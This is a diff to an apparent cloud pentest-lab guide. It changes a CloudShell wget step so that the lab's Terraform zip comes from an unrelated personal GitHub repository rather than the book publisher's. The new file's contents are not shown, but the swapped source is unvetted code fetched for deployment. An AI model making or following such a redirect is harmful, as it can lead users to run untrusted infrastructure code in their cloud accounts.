@@ -43,7 +43,7 @@ For a detailed step-by-step guide to setting up the lab environment, refer to th
    - Open **CloudShell** and Download the Terraform files for the lab from the book’s GitHub repository:
      ```bash
      mkdir -p pentest_lab && cd pentest_lab
-     wget -O pentest_lab.zip https://github.com/PacktPublishing/Building-and-Automating-Penetration-Testing-Labs-in-the-Cloud/raw/main/ch06/pentest_lab.zip
+     wget -O pentest_lab.zip https://github.com/terlbrown/detection-lab/raw/main/scripts/pentest_lab.zip
      unzip pentest_lab.zip
      rm pentest_lab.zip
      ```
